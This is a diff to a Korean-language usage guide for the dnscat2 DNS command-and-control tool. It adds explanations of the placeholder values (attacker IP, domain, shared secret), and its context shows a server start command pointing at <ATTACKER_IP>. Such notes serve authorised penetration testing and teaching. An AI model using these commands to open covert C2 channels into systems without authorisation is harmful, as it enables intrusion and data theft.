@@ -20,6 +20,7 @@ dnscat2는 DNS 질의와 응답을 이용해 명령·제어 통신을 전달하�
 - 실행 위치: 공격 호스트의 dnscat2 server와 대상 호스트의 client
 - 필요한 입력: 양쪽이 공유할 secret, 사용할 도메인 또는 직접 질의할 DNS server 주소
 - 전제: 대상에서 DNS egress가 허용되고 client를 실행할 코드 실행 권한이 있어야 한다.
+- `<DOMAIN>`은 DNS query를 위임하거나 관찰하는 domain, `<DNS_SERVER>`는 client가 직접 질의할 server 주소이며 `<SECRET>`은 양쪽에 같은 값으로 제공한다. server 창·window ID는 시작 출력에서 얻고 shell 획득과 혼동하지 않는다.
 
 
 ## 표준 사용법
@@ -31,6 +32,8 @@ sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
 대상에서는 native client 또는 PowerShell client를 실행하고, server가 출력한 secret을 맞춘다. PowerShell client를 사용할 때는 해당 저장소가 archived 상태이며 server에 `--no-cache`가 필요하다는 버전 조건을 적용한다.
 
 ## 대표 예시
+
+`<ATTACKER_IP>`는 client가 DNS 질의할 server 주소(예: `192.0.2.10`), `<DOMAIN>`은 위임 또는 관찰할 DNS suffix(예: `tunnel.example.test`)다. `<SECRET>`은 server 시작 출력에서 얻어 양쪽에 같은 형식으로 전달하며, window ID는 server의 `New window created` 출력에서 재사용한다.
 
 ### server 시작
 
